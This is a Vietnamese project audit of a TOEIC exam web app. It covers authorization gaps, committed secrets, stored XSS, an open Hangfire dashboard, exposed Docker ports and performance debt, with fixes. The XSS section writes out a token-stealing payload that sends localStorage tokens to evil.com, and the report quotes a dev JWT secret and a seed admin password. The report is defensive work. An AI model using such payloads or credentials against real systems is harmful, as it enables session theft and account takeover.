# Hiện trạng dự án & khuyến nghị

> **Mục đích:** nói thật dự án đang ở đâu, hỏng chỗ nào, sửa thế nào và vì sao — rồi hướng dẫn deploy
> thực chiến ở cuối.
>
> **Tài liệu song sinh:** [08-cam-nang-cong-nghe.md](08-cam-nang-cong-nghe.md) — giải thích công nghệ
> để trả lời phỏng vấn. Nói gọn: **cẩm nang = hiểu để nói · tài liệu này = làm để chạy.**
>
> **Nguồn dữ liệu:** đợt audit ngày 2026-07-26 trên commit `d2d19f2` — 14 agent đọc song song toàn bộ
> codebase (463 lượt đọc file), phát hiện **123 vấn đề**. Các vấn đề nghiêm trọng nhất đã qua **phản
> biện độc lập**: mỗi phát hiện được giao cho một agent thứ hai cố gắng bác bỏ, và phát biểu cuối cùng
> là bản đã đính chính.
>
> **Ký hiệu tin cậy:** 🔬 đã phản biện độc lập · 📋 phát hiện một lần, chưa phản biện chéo

---

## Mục lục

| Phần | Nội dung |
|---|---|
| [0](#0-bảng-điểm-hiện-trạng) | Bảng điểm hiện trạng từng mảng |
| [1](#1-tám-vấn-đề-chặn-deploy) | **8 vấn đề CHẶN DEPLOY** — không sửa thì không được lên |
| [2](#2-vấn-đề-ảnh-hưởng-trực-tiếp-người-dùng) | Vấn đề ảnh hưởng trực tiếp người dùng |
| [3](#3-nợ-kỹ-thuật-còn-lại) | Nợ kỹ thuật còn lại |
| [4](#4-lộ-trình-sửa) | Lộ trình sửa — 4 giai đoạn |
| [5](#5-hướng-dẫn-deploy-thực-chiến) | **Hướng dẫn deploy thực chiến** |

---

# 0. Bảng điểm hiện trạng

| Mảng | Điểm | Nhận xét thật |
|---|---|---|
| **Kiến trúc** | 🟢 Tốt | Clean Architecture 4 tầng rõ ràng, `Result<T>` dùng nhất quán, DI đúng. Lệch chuẩn ở chỗ service nằm ở Infrastructure — chấp nhận được và giải thích được |
| **Nghiệp vụ cốt lõi** | 🟢 Tốt | Exam engine chạy đủ luồng. `ToeicScoreHelper` tách thuần, có 30 unit test. Đây là **điểm mạnh nhất** của dự án |
| **Authentication** | 🟡 Khá | JWT + refresh rotation + Google OAuth làm đúng. Thiếu: lockout, reuse detection, hash refresh token |
| **Authorization (API)** | 🟢 Đã vá (2026-08-04) | Có **fallback policy** `RequireAuthenticatedUser` → mặc định ĐÓNG. Ngân hàng câu hỏi khóa theo role, ownership check tốt ở phiên thi. Bảng phân quyền: [10-phan-quyen-endpoint.md](10-phan-quyen-endpoint.md). Còn nợ: `PracticeController` thiếu ownership check (Day 47) |
| **Authorization (UI)** | 🔴 Chưa có | Frontend không biết role. User thấy menu quản trị |
| **Database** | 🟡 Khá | 29 index đầy đủ, Fluent API sạch, Value Converter đúng. Thiếu concurrency token |
| **Hiệu năng** | 🟠 Yếu | Repository materialize-everything là gốc rễ: phân trang trong RAM, không `AsNoTracking`, query không trần |
| **Bảo mật** | 🔴 Nhiều lỗ hổng | Secrets trong git, XSS chưa sanitize, Hangfire dashboard mở, static files public |
| **Cấu hình** | 🔴 Không chạy được prod | `appsettings.json` thiếu `Jwt`/`Redis`/`Cors` + dùng `!` → **crash lúc khởi động** ở mọi môi trường ≠ Development |
| **Frontend** | 🟡 Khá | React 19, kỹ thuật thi (debounce, useRef guard) làm tốt. Thiếu auto-refresh token — hỏng UX nặng |
| **Testing** | 🟠 Yếu | 30 test nhưng chỉ phủ 2 hàm thuần. **0 test cho exam engine** — phần phức tạp nhất |
| **CI/CD** | 🔴 Chưa có | `.github/workflows/` rỗng. 30 test không bao giờ chạy tự động |
| **Deploy** | ⬜ Chưa làm | Chưa có Dockerfile, chưa có Nginx, chưa deploy lần nào |

**Tóm tắt một câu:** phần *xây dựng tính năng* làm tốt; phần *đưa sản phẩm ra đời thật* (cấu hình
production, bảo mật, vận hành) gần như chưa động tới.

---

# 1. Tám vấn đề chặn deploy

> Đây là danh sách **phải sửa trước khi đưa lên Internet**. Xếp theo thứ tự nên sửa.

## 1.1 · ✅ ĐÃ VÁ 2026-08-04 — Lộ toàn bộ đáp án cho người không đăng nhập

> **Trạng thái:** đã sửa. Fallback policy ở `Program.cs:134-137`, `QuestionController` khóa
> `[Authorize(Roles="Admin,ContentManager")]` cấp class, `TestController` siết `GetList`/`GetDetail`.
> Kiểm chứng bằng curl: ẩn danh 401 · token User 403 (`Content-Length: 0`) · token Admin 200.
> Bảng phân quyền đầy đủ: [10-phan-quyen-endpoint.md](10-phan-quyen-endpoint.md).
>
> **Giữ lại toàn bộ phân tích dưới đây** — đây là chuỗi khai thác thật đã tự tìm ra và tự vá, dùng để
> trả lời *"bạn từng tìm thấy lỗ hổng bảo mật nào chưa?"*.
>
> **Hai điều học được mà lúc đầu không biết:**
> 1. `[Authorize]` **trần** là vô nghĩa khi fallback policy đã là `RequireAuthenticatedUser` — đã mắc
>    đúng lỗi này, phải thêm `Roles` mới siết được.
> 2. Đọc response phân biệt được chặn ở đâu: `403` + `Content-Length: 0` = chặn ở middleware;
>    `400` + body nghiệp vụ = **đã đi qua** authorization vào tới service.

**Vị trí:** [QuestionController.cs:20-37](../backend/ToeicMasterPro.API/Controllers/QuestionController.cs#L20)
kết hợp [QuestionService.cs:140-145](../backend/ToeicMasterPro.Infrastructure/Services/QuestionService.cs#L140)

**Sự việc:** `GET /api/Question` và `GET /api/Question/{id}` **không có `[Authorize]`** ở cả cấp action
lẫn cấp class, và backend **không đăng ký fallback policy** nào (grep
`AddAuthorization|FallbackPolicy|AuthorizeFilter|RequireAuthorization` toàn backend = **0 kết quả**).

Chúng trả về `QuestionResponse` chứa `Explanation` và danh sách `OptionResponse(..., bool IsCorrect)`:
```csharp
// QuestionService.cs:140-145
private static QuestionResponse MapToResponse(Question q, List<QuestionOption> options)
  => new(q.Id, q.Part, q.Difficulty, q.Content, q.Explanation, q.AudioUrl, q.ImageUrl,
         q.Passage, q.Tags, q.IsPublished,
         options.Select(o => new OptionResponse(o.Id, o.Label, o.Content, o.IsCorrect)).ToList());
```

**Hậu quả cụ thể:**
```bash
curl http://host/api/Question        # không kèm token
# → toàn bộ ngân hàng câu hỏi, kèm isCorrect từng đáp án và explanation
```
- **Không phân trang, không rate limit** → dump cả kho trong một lần gọi
- Tham số `isPublished` là optional nullable → **cả câu hỏi chưa publish (bản nháp) cũng lộ**
- `PlayQuestionItem` trả về chính `Question.Id` khi đang thi → client đang thi cầm sẵn QuestionId, chỉ
  cần gọi `GET /api/Question/{id}` ẩn danh là có đáp án đúng của **đúng câu đó** — tra cứu 1-1, tự động hóa được

**Vì sao chắc chắn là lỗ hổng chứ không phải thiết kế:** dự án đã **cố ý** xây DTO riêng để giấu đáp án
ở mọi luồng học viên — `TestPlayResponse`/`PlayOptionItem` có comment *"KHÔNG có IsCorrect / Explanation"*,
`PracticeQuestionResponse` tương tự, và `/api/Test/{id}/play` có `[Authorize]`.
`GET /api/Question` **đi vòng qua toàn bộ lớp bảo vệ đó mà còn không cần đăng nhập**.

**Phân loại:** OWASP API5:2023 Broken Function Level Authorization + API3 Excessive Data Exposure.

**Cách sửa — làm cả hai:**
```csharp
// 1. Vá ngay endpoint này
[HttpGet]
[Authorize(Roles = "Admin,ContentManager")]
public async Task<IActionResult> GetList(...)

// 2. Sửa gốc rễ — secure by default, trong Program.cs
builder.Services.AddAuthorizationBuilder()
    .SetFallbackPolicy(new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build());
// Sau đó đánh dấu [AllowAnonymous] tường minh cho login/register/exam-schedule công khai
```

**Vì sao phải làm cả hai:** vá một endpoint chỉ chữa triệu chứng. Fallback policy biến
*"quên `[Authorize]` = lộ dữ liệu"* thành *"quên `[AllowAnonymous]` = 401"* — **hỏng an toàn thay vì
hỏng nguy hiểm**. Đây cũng là câu trả lời rất mạnh khi phỏng vấn hỏi về tư duy bảo mật.

> **Lưu ý cùng loại 📋:** `GET /api/test` và `GET /api/test/{id}` cũng ẩn danh — lộ đề nháp chưa publish
> và cấu trúc đề. Fallback policy xử lý luôn cả hai.

## 1.2 · 🔴 📋 Ứng dụng KHÔNG THỂ khởi động ở Production

**Vị trí:** [Program.cs:64](../backend/ToeicMasterPro.API/Program.cs#L64),
[Program.cs:101](../backend/ToeicMasterPro.API/Program.cs#L101), `appsettings.json`

**Sự việc:** các section `Jwt`, `Redis`, `Cors` **chỉ tồn tại trong `appsettings.Development.json`**.
File base `appsettings.json` không có. Trong khi code dùng **null-forgiving operator `!`**:
```csharp
var redisConn = builder.Configuration["Redis:ConnectionStrings"]!;              // :64
var jwt = builder.Configuration.GetSection(JwtSettings.SectionName).Get<JwtSettings>()!;  // :101
```

**Hậu quả:** chạy với `ASPNETCORE_ENVIRONMENT=Production` → `jwt` là `null` → dòng 120 truy cập
`jwt.Issuer` → **`NullReferenceException` ngay lúc khởi động**. App chết trước khi nhận request đầu tiên.

> Đây là lý do vì sao vấn đề secrets ở mục 1.3 **chưa** bị khai thác: **chưa từng tồn tại một instance
> production nào để bị tấn công.**

**Cách sửa:**
1. Đưa **cấu trúc** section vào `appsettings.json` (giá trị rỗng), giá trị thật đến từ biến môi trường
2. Bỏ `!`, thay bằng kiểm tra tường minh **fail fast có thông báo rõ**:
```csharp
var jwt = builder.Configuration.GetSection(JwtSettings.SectionName).Get<JwtSettings>()
    ?? throw new InvalidOperationException(
        "Thiếu cấu hình 'Jwt'. Đặt biến môi trường Jwt__SecretKey, Jwt__Issuer, Jwt__Audience.");
```
Crash kèm thông báo rõ ràng tốt hơn `NullReferenceException` gấp nhiều lần.

## 1.3 · 🔴 🔬 Secrets nằm trong git từ commit đầu tiên

**Vị trí:** `appsettings.Development.json` (bị git track từ commit `e5172e7`, 2026-06-18) và
`appsettings.json`

| Dòng | Chứa gì |
|---|---|
| `appsettings.Development.json:15` | **JWT SecretKey** — `"toeic-master-pro-super-secret-key-2026-change-in-production"` |
| `:3` | Chuỗi kết nối tài khoản `sa` |
| `:6` | Mật khẩu Redis |
| `:24-28` | Mật khẩu Admin seed — `"Admin@2026"` |
| `appsettings.json:10` | **Chuỗi kết nối `sa`** — file base, nạp ở **mọi** môi trường |

**Vì sao SecretKey nguy hiểm nhất:** nó là khóa **đối xứng** ký HMAC-SHA256
([TokenService.cs:36-40](../backend/ToeicMasterPro.Infrastructure/Authentication/TokenService.cs#L36)),
và role được ký bằng `ClaimTypes.Role` khớp đúng cấu hình verify.
→ **Ai đọc được repo đều tự ký được access token role Admin hợp lệ mà không cần đăng nhập.**
Dự án **không có** cơ chế bù trừ nào: không `OnTokenValidated`, không kiểm `SecurityStamp`, không
revocation cho access token.

**Đính chính quan trọng (từ bước phản biện):** đây là secret **môi trường DEV**, không phải production —
mọi launch profile đặt `ASPNETCORE_ENVIRONMENT=Development`, repo không có `appsettings.Production.json`.
Cộng với mục 1.2 (app không start được ở Production), **chưa hề tồn tại instance production để bị chiếm**.
Mức đúng là **HIGH — lỗi chặn deploy bắt buộc xử lý**, không phải "đang bị khai thác".

Hai chi tiết phụ đáng biết:
- `"Cm@2026"` chỉ **7 ký tự** → không thỏa `RequiredLength = 8` → `Program.cs:274` **nuốt lỗi im lặng**
  → tài khoản ContentManager **thực tế chưa bao giờ được tạo**
- SQL/Redis chỉ bind localhost trên máy dev nên hai mật khẩu đó không khai thác từ xa được

**Cách sửa — theo đúng thứ tự:**
```bash
# 1. Coi như đã lộ — đổi TOÀN BỘ secret trước tiên
#    Sinh SecretKey mới đủ entropy:
openssl rand -base64 48

# 2. Gỡ khỏi git tracking, giữ file trên máy
git rm --cached backend/ToeicMasterPro.API/appsettings.Development.json
echo "appsettings.Development.json" >> .gitignore

# 3. Tạo file mẫu để người khác biết cần điền gì
#    appsettings.Development.example.json — chỉ tên khóa, giá trị rỗng

# 4. Dev chuyển sang User Secrets (nằm NGOÀI thư mục project)
dotnet user-secrets init --project backend/ToeicMasterPro.API
dotnet user-secrets set "Jwt:SecretKey" "<gia-tri-moi>" --project backend/ToeicMasterPro.API

# 5. Production dùng biến môi trường: Jwt__SecretKey (hai gạch dưới thay dấu hai chấm)
```

> ⚠️ **Xóa file đi là chưa đủ** — git giữ toàn bộ lịch sử, ai cũng `git log -p` ra được. Muốn xóa sạch
> phải viết lại lịch sử bằng `git filter-repo` (rồi force-push, và mọi người phải clone lại).
> **Với repo cá nhân chưa public, cách rẻ hơn và đủ an toàn là: đổi hết secret rồi ngừng commit chúng.**

## 1.4 · 🔴 📋 Stored XSS — 15 chỗ render HTML thô

**Vị trí:** `MockTestPlayPage.tsx:1087, 1117, 1200, 1234, 1262, 1362, 1434, 1454`;
`ExamAnswerReviewPanel.tsx:266`; `PracticePage.tsx:311`…

**Sự việc:** nội dung câu hỏi do CM soạn bằng TipTap nên là HTML, được render bằng
`dangerouslySetInnerHTML`. **Không sanitize ở cả frontend lẫn backend.**

**Chuỗi khai thác đầy đủ:**
1. CM (hoặc kẻ chiếm được tài khoản CM) soạn nội dung câu hỏi chứa
   `<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('accessToken'))">`
2. Nội dung lưu thẳng vào DB, không lọc
3. Mọi user làm đề đó → script chạy trong trình duyệt họ
4. Token lưu `localStorage` ([token.ts:5-8](../frontend/src/lib/token.ts#L5)) → **JS đọc được** → gửi về server kẻ tấn công
5. Kẻ tấn công dùng token đó mạo danh user

**Cách sửa — bắt buộc làm ở backend:**
```csharp
// dotnet add package HtmlSanitizer
private static readonly HtmlSanitizer _sanitizer = new();
// Trong QuestionService, trước khi lưu:
q.Content = _sanitizer.Sanitize(req.Content);
q.Explanation = _sanitizer.Sanitize(req.Explanation);
q.Passage = _sanitizer.Sanitize(req.Passage);
```

> **Vì sao phải ở backend, không chỉ frontend:** frontend chạy trên máy người dùng — bỏ qua được.
> Kẻ tấn công gọi thẳng API bằng curl là qua mặt mọi kiểm tra phía client.
> **Nguyên tắc: sanitize lúc GHI, escape lúc ĐỌC.**

**Giảm thiệt hại kèm theo:** chuyển access token khỏi `localStorage` (giữ trong memory, refresh token
trong httpOnly cookie) → XSS không lấy được token nữa.

## 1.5 · 🔴 📋 Hangfire Dashboard mở cho tất cả mọi người

**Vị trí:** [Program.cs:221](../backend/ToeicMasterPro.API/Program.cs#L221)
```csharp
app.UseHangfireDashboard("/hangfire"); // Dev xem job: http://localhost:5191/hangfire
```

Comment ghi "Dev" nhưng dòng này **nằm ngoài khối `if (app.Environment.IsDevelopment())`** và
**không có** `DashboardOptions.Authorization`.

**Hậu quả:** deploy lên là ai vào `domain.com/hangfire` cũng xem được danh sách job, lịch sử chạy, và
bấm **"Trigger now"**.

**Cách sửa:**
```csharp
public class AdminOnlyDashboardFilter : IDashboardAuthorizationFilter
{
    public bool Authorize(DashboardContext context)
    {
        var http = context.GetHttpContext();
        return http.User.Identity?.IsAuthenticated == true && http.User.IsInRole("Admin");
    }
}

// Program.cs — và đặt SAU UseAuthentication/UseAuthorization
app.UseHangfireDashboard("/hangfire", new DashboardOptions {
    Authorization = new[] { new AdminOnlyDashboardFilter() }
});
```

## 1.6 · 🟠 📋 Redis kết nối đồng bộ lúc khởi động

**Vị trí:** [Program.cs:66](../backend/ToeicMasterPro.API/Program.cs#L66)
```csharp
builder.Services.AddSingleton<IConnectionMultiplexer>(ConnectionMultiplexer.Connect(redisConn));
```

`Connect()` chạy **ngay lúc dựng DI container**, đồng bộ và chặn. Redis chưa sẵn sàng → **API sập lúc boot**.

**Nghịch lý:** `ICacheService` **không được inject ở bất kỳ đâu** — Redis là code chết, nhưng lại là
**dependency bắt buộc để app khởi động được**.

Trên máy dev không sao vì Redis đã chạy sẵn. Trên VPS với docker-compose, **thứ tự container khởi động
không đảm bảo** → lỗi này rất dễ xảy ra khi deploy.

**Cách sửa:**
```csharp
builder.Services.AddSingleton<IConnectionMultiplexer>(_ =>
    ConnectionMultiplexer.Connect(redisConn));   // lambda: hoãn tới khi thật sự cần
```
Thêm `abortConnect=false` vào connection string để Redis tạm chết không làm sập app.

## 1.7 · 🔴 📋 docker-compose: 3 vấn đề phải sửa trước khi lên prod

| Vấn đề | Vị trí | Sửa |
|---|---|---|
| **`MSSQL_PID=Developer`** — bản Developer **miễn phí nhưng cấm dùng production** | `docker-compose.yml:26` | Đổi `Express` (miễn phí cho production; giới hạn 10GB DB / 1.4GB buffer / 4 core — thừa cho dự án) |
| **Bind port ra `0.0.0.0`** — SQL Server và Redis lộ ra **toàn bộ card mạng**, comment khẳng định ngược lại là "chỉ expose local" | `docker-compose.yml:27-28, 50-51` | Bản production: **bỏ hẳn** mục `ports`, để container nói chuyện qua mạng nội bộ Docker |
| **Hardcode mật khẩu thật làm fallback** `${DB_PASSWORD:-ToeicMaster@2026}` — vô hiệu hóa hoàn toàn việc gitignore `.env` | `docker-compose.yml:25, 33, 57, 65` | Bỏ fallback, để compose báo lỗi nếu thiếu biến |

> **Vì sao bind `0.0.0.0` nguy hiểm:** SQL Server hở ra Internet với tài khoản `sa` sẽ bị bot quét và
> tấn công **trong vòng vài giờ**. Đây là một trong những cách bị hack nhanh nhất.

## 1.8 · 🟠 📋 File media hoàn toàn public

**Vị trí:** [Program.cs:215-217](../backend/ToeicMasterPro.API/Program.cs#L215)
```csharp
app.UseStaticFiles();        // ← đứng TRƯỚC
app.UseCors("Frontend");
app.UseAuthentication();     // ← authentication chạy SAU
```

Middleware chạy tuần tự: `UseStaticFiles` khớp đường dẫn `/uploads/...` là **trả file rồi dừng**,
không bao giờ chạm tới `UseAuthentication`.

**Hậu quả:** toàn bộ **audio đề thi, ảnh đề thi, avatar user** tải được không cần token. Đoán được
đường dẫn là lấy được. Với đề TOEIC có bản quyền thì đây là vấn đề thật.

**Cách sửa:** tách hai loại tài nguyên — file thật sự công khai giữ ở `wwwroot`, file cần bảo vệ chuyển
sang serve qua controller có `[Authorize]`:
```csharp
[HttpGet("audio/{testId:Guid}/{fileName}")]
[Authorize]
public IActionResult GetAudio(Guid testId, string fileName) { /* kiểm quyền rồi trả PhysicalFile */ }
```

---

# 2. Vấn đề ảnh hưởng trực tiếp người dùng

> Không chặn deploy, nhưng **user sẽ gặp ngay** khi dùng thật.

## 2.1 · 🔴 📋 User bị đá khỏi bài thi ở phút 61 — mất toàn bộ bài làm

**Vị trí:** [axios.ts:19-34](../frontend/src/api/axios.ts#L19)

Response interceptor gặp 401 thì **xóa token và chuyển về `/login`** — **không hề gọi refresh token**.

Backend **có** `/api/auth/refresh`, frontend **có** lưu refresh token, nhưng **chưa bao giờ dùng đến**.

**Con số cụ thể — đây là lỗi nặng nhất về trải nghiệm:**
- Access token: **60 phút** (cấu hình trong appsettings)
- Bài thi TOEIC full: **~2 tiếng** (Listening 45' + Reading 75')

→ **Mọi user thi full test đều sẽ bị đá ra giữa chừng.** Không phải rủi ro — là điều **chắc chắn xảy ra**.

**Cách sửa:**
```ts
let refreshing: Promise<string> | null = null

api.interceptors.response.use(undefined, async (error) => {
  const original = error.config
  if (error.response?.status !== 401 || original._retry) return Promise.reject(error)
  original._retry = true

  // Gộp mọi request 401 đồng thời vào MỘT lần refresh (chống refresh token race)
  refreshing ??= authService.refresh(getRefreshToken()!)
      .then(r => { saveTokens(r.accessToken, r.refreshToken); return r.accessToken })
      .finally(() => { refreshing = null })

  const newToken = await refreshing
  original.headers.Authorization = `Bearer ${newToken}`
  return api(original)
})
```

> **Keyword: refresh token race.** Nhiều request cùng 401 → cùng gọi refresh → token rotation làm các
> lần sau thất bại. Biến `refreshing` giữ chung một promise là cách chuẩn để chống.

**Cách chữa cháy tạm nếu chưa kịp sửa:** nâng `AccessTokenExpiryMinutes` lên 180. Không phải giải pháp
đúng (token sống lâu = lộ thì thiệt hại lâu) nhưng chặn được lỗi mất bài ngay lập tức.

## 2.2 · 🔴 📋 F5 giữa bài thi mất sạch

**Vị trí:** [MockTestPlayPage.tsx:131-194](../frontend/src/pages/MockTestPlayPage.tsx#L131)

F5 → component mount lại → gọi `start` → **tạo phiên thi MỚI**. Đồng hồ reset về 75:00, đáp án biến
khỏi màn hình (dữ liệu vẫn còn trong DB ở phiên cũ, nhưng user không vào lại được).

Có `beforeunload` cảnh báo, nhưng user vẫn F5 được — và trình duyệt mobile đôi khi tự reload tab.

**Cách sửa:**
```ts
// Lưu sessionId khi start
sessionStorage.setItem(`exam:${testId}`, sessionId)

// Khi mount: có phiên đang dở thì khôi phục thay vì tạo mới
const existing = sessionStorage.getItem(`exam:${testId}`)
if (existing) { /* GET /api/test-session/{id} → khôi phục đáp án + thời gian còn lại */ }
```
Backend cần thêm endpoint trả phiên `InProgress` kèm đáp án đã lưu.

> Kèm theo: server nên lưu `StartedAt` và tính thời gian còn lại **phía server** — hiện tại
> `DurationMinutes` chỉ là số trang trí, **không có ràng buộc thời gian nào ở server**, phiên thi có
> thể nộp sau nhiều ngày.

## 2.3 · 🟠 📋 Import Excel tạo được câu hỏi KHÔNG có đáp án đúng → chặn vĩnh viễn việc nộp bài

**Vị trí:** [QuestionService.cs:218-233](../backend/ToeicMasterPro.Infrastructure/Services/QuestionService.cs#L218)

Luồng tạo câu hỏi qua API có `Validate()` bắt buộc đúng 1 đáp án đúng. **Luồng import Excel bỏ qua
kiểm tra đó.**

Trong khi `SubmitAsync` gặp câu không có đáp án đúng thì **trả lỗi cho cả bài thi**:
```csharp
if (correctOpt is null)
    return Result<...>.Failure($"Câu OrderIndex {tq.OrderIndex} chưa có đáp án đúng trong DB.");
```

**Hậu quả:** CM import một file Excel sai một ô → **mọi user làm đề đó đều không nộp bài được**, vĩnh
viễn, cho tới khi có người phát hiện và sửa DB.

**Cách sửa:** dùng chung `Validate()` cho cả luồng import; dòng nào sai thì bỏ qua và báo cáo, không tạo.

## 2.4 · 🟠 📋 `POST /api/practice/submit` là máy tra đáp án

**Vị trí:** [PracticeService.cs:69-114](../backend/ToeicMasterPro.Infrastructure/Services/PracticeService.cs#L69)

Endpoint chấm **bất kỳ `questionId` nào** được gửi lên, không kiểm tra câu đó có thuộc phiên luyện của
user không.

→ User đang thi thật, lấy `questionId` từ màn hình, gửi vào `/api/practice/submit` với đáp án A → biết
ngay đúng/sai → thử B, C, D. **Máy tra đáp án hợp lệ, có xác thực đàng hoàng.**

**Cách sửa:** tạo phiên practice có state (giống `TestSession`), chỉ chấm câu thuộc phiên đó.

## 2.5 · 🟠 📋 Autosave đáp án có chi phí O(n²)

**Vị trí:** [TestSessionService.cs:91-127](../backend/ToeicMasterPro.Infrastructure/Services/TestSessionService.cs#L91)

Mỗi lần user chọn một đáp án, `SaveAnswersAsync`:
1. Nạp lại **toàn bộ** câu hỏi trong phạm vi đề (để validate)
2. Nạp **toàn bộ** đáp án đã lưu của phiên
3. Sinh `UPDATE` cho mọi câu trong payload

Frontend debounce nhưng vẫn gọi rất nhiều lần trong một bài thi. Với 200 câu, tổng chi phí một lượt thi
tăng theo **bình phương** số câu đã trả lời.

**Cách sửa:** cache tập `questionId` hợp lệ của phiên (Redis hoặc memory) thay vì query lại mỗi lần;
chỉ upsert đúng những câu có trong payload.

## 2.6 · 🟠 📋 Logout thực tế không bao giờ được gọi

**Vị trí:** [auth.store.ts:35-38](../frontend/src/store/auth.store.ts#L35),
[Header.tsx:8-11](../frontend/src/components/layout/Header.tsx#L8)

Frontend logout chỉ **xóa localStorage**. Backend **có** endpoint `/api/auth/logout` nhưng
**không ai gọi**.

→ Refresh token vẫn sống **30 ngày** trong DB sau khi user đã "đăng xuất". Ai có refresh token đó vẫn
lấy được access token mới.

**Cách sửa:** gọi `POST /api/auth/logout` với refresh token trước khi xóa local state.

## 2.7 · 🟠 📋 Không có khóa tài khoản khi sai mật khẩu

**Vị trí:** [AuthService.cs:65](../backend/ToeicMasterPro.Infrastructure/Services/AuthService.cs#L65)

Dùng `CheckPasswordAsync` thay vì `SignInManager.PasswordSignInAsync` → **bỏ qua hoàn toàn cơ chế
lockout** của Identity. `Program.cs:39-46` cũng không cấu hình `options.Lockout.*`.

Chỉ còn rate limit 5 req/phút **theo IP** chặn — đổi IP là brute-force thoải mái.

**Cách sửa:** chuyển sang `SignInManager.PasswordSignInAsync(user, password, false, lockoutOnFailure: true)`
và cấu hình `MaxFailedAccessAttempts = 5`, `DefaultLockoutTimeSpan = 15 phút`.

## 2.8 · 🟡 📋 Job nhắc lịch thi chạy sai giờ

**Vị trí:** [Program.cs:223-226](../backend/ToeicMasterPro.API/Program.cs#L223)

Cron `"30 0 * * *"` — Hangfire mặc định hiểu theo **UTC**. Comment ghi "00:30 mỗi ngày" nhưng thực tế
chạy **07:30 giờ Việt Nam**.

Kèm theo ([ExamReminderService.cs:41-67](../backend/ToeicMasterPro.Infrastructure/Services/ExamReminderService.cs#L41)):
gửi mail **trước khi** commit `EmailSent = true` → `SaveChanges` lỗi sau khi mail đã gửi thì lần sau
**gửi trùng**. Và so khớp ngày **tuyệt đối** (`ExamDate.Date == hôm nay + 3`) → job lỡ một ngày là
**mất hẳn** lượt nhắc đó.

**Cách sửa:** truyền `TimeZoneInfo` vào `RecurringJobOptions`; commit `EmailSent` trước khi gửi (hoặc
dùng outbox pattern); đổi điều kiện thành khoảng `<= hôm nay + 3` thay vì bằng đúng.

---

# 3. Nợ kỹ thuật còn lại

> Không gấp, nhưng nên biết — và **rất đáng nói khi phỏng vấn hỏi "dự án còn điểm gì chưa tốt"**.

## 3.1 · Hiệu năng

| Vấn đề | Vị trí | Cách sửa |
|---|---|---|
| **Gốc rễ: Repository materialize-everything** | `Repository.cs:25-26` | Cho `IRepository<T>` trả `IQueryable<T>`, hoặc thêm overload có `orderBy/skip/take/selector` |
| Phân trang lịch sử thi trong RAM | `TestSessionService.cs:479-490` | Hệ quả của trên |
| `/stats/parts` không có trần — nạp toàn bộ answer + question + option của user | `TestSessionService.cs:865-914` | Một query LINQ join + `GroupBy(q.Part)` để SQL trả ~7 dòng. **Dùng `ans.IsCorrect` đã lưu sẵn** thay vì query lại `QuestionOption` |
| **Không có `AsNoTracking` ở bất kỳ đâu** | toàn bộ | `UseQueryTrackingBehavior(QueryTrackingBehavior.NoTracking)` mặc định, bật tracking cho luồng ghi |
| `CancellationToken` có chữ ký nhưng không bao giờ truyền | `IRepository.cs:17` | Thêm `ct` vào action, truyền xuyên xuống. **Chi phí gần bằng 0** |
| N+1 thật khi import Excel | `QuestionService.cs:272-274` | `SaveChangesAsync` **ra ngoài** vòng lặp |
| Đếm số câu bằng cách nạp cả bảng | `TestService.cs:35-38` | `CountAsync()` dưới SQL |
| Practice: nạp cả kho câu hỏi rồi random trong RAM | `PracticeService.cs:29-46` | `ORDER BY NEWID()` hoặc lấy id trước rồi query theo lô |
| `.ToLower()` vô hiệu hóa index | `VocabularyService.cs:20-22` | Dùng collation case-insensitive ở cột thay vì hàm trong `WHERE` |
| Dashboard gọi 3 endpoint, mỗi cái quét lại toàn bộ phiên thi | `DashboardPage.tsx:220-222` | Cache Redis 5 phút — **đây chính là chỗ Redis trở nên hữu dụng** |
| Chưa có `EnableRetryOnFailure` | `Program.cs:35-36` | Bật retry cho transient fault — quan trọng khi lên VPS |

## 3.2 · Đúng đắn dữ liệu

| Vấn đề | Vị trí | Ghi chú |
|---|---|---|
| 🔬 **`GetDetail` chấm lại theo scope đề HIỆN TẠI** → xem lại một phiên cũ có thể ra điểm khác lịch sử | `TestSessionService.cs:541-662` | Ví dụ đã kiểm chứng: Reading 76/100 lưu 335; CM thêm 1 câu → scope 101 → rơi khỏi bảng ETS sang công thức MVP → **375, lệch 40 điểm**. DB không bị ghi đè, chỉ bất nhất khi hiển thị. Sửa: dùng snapshot điểm đã lưu, đừng chấm lại |
| 🔬 **TOCTOU khi nộp bài** | `TestSessionService.cs:143-263` | Hai request submit đồng thời cùng qua được check `InProgress`. `SaveChanges` atomic nên **không hỏng dữ liệu**, nhưng request thua vi phạm unique index → **HTTP 500** dù bài đã nộp thành công. Sửa: thêm `RowVersion` concurrency token |
| Không có concurrency token trên bất kỳ entity nào | `BaseEntity.cs` | **Lost update im lặng**: hai người sửa cùng bản ghi, người sau ghi đè người trước, không ai biết |
| `SaveAnswers` gửi trùng `questionId` trong 1 payload → 500 | `TestSessionService.cs:94-123` | Dedupe payload trước khi xử lý |
| `SkippedCount` ở nhánh fallback tính sai công thức | `TestSessionService.cs:654-661` | Đang là "số câu SAI + BỎ QUA" thay vì chỉ bỏ qua |
| Xóa/sửa `Question` đã có người trả lời → FK Restrict → 500 | `QuestionService.cs:105-128` | Bắt `DbUpdateException`, trả 400 với thông báo rõ |
| Cột `TestSessionAnswer.IsCorrect` **ghi mà không bao giờ đọc** | `TestSessionService.cs:211` | Mọi nơi đều chấm lại từ `SelectedOptionId`. Vừa lãng phí vừa là nguồn bất nhất |
| `fullOnly` nhận diện "full test" bằng `PartsFilter` rỗng | `TestSessionService.cs:699, 759, 825, 867` | User chọn **đủ cả 7 Part** vẫn bị loại khỏi thống kê vì `PartsFilter` không rỗng |
| `WeakestParts` không tính cỡ mẫu | `TestSessionService.cs:924-934` | Làm 1 câu Part 2 và sai → Part 2 mãi là "yếu nhất". Lọc `Total >= 5` |
| Điểm nhảy bậc khi section lệch 1 câu so với 100 | `ToeicScoreHelper.cs:41-52` | 100 câu → tra bảng ETS; 99 hoặc 101 câu → rơi sang công thức MVP, chênh vài chục điểm |

## 3.3 · Bảo mật còn lại

| Vấn đề | Vị trí |
|---|---|
| Import ZIP giải nén file **bất kỳ đuôi nào** vào `wwwroot` → ghi được HTML/JS lên chính origin của API; không giới hạn số entry (**zip bomb**) | `TestController.cs:177-198` |
| `MediaController` chỉ tin phần mở rộng, không kiểm nội dung file, ghi đè im lặng | `MediaController.cs:44-77` |
| Refresh token lưu **plaintext** trong DB | `TokenService.cs:60-65` |
| Không có **reuse detection** cho refresh token | `AuthService.cs:73-86` |
